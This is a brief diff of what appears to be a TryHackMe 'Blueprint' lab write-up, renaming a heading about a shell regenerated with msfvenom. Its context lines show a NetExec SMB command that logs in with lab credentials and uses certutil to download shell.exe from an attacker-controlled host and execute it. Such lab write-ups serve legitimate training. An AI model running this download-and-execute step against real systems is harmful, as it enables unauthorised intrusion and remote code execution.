@@ -266,7 +266,7 @@ SMB         10.10.161.90    445    BLUEPRINT        This version of c:\temp\shel
 ```
 
 
-## Redownload shell and execute
+## Redownload shell that is re-created using msfvenom (x86) and execute
 ```
 ┌──(kali㉿kali)-[~/thm/blueprint]
 └─$ nxc smb blueprint.thm -u localadmin -p P@ssw0rd -x 'certutil -urlcache -split -f http://10.14.28.97/shell.exe c:\temp\shell.exe'
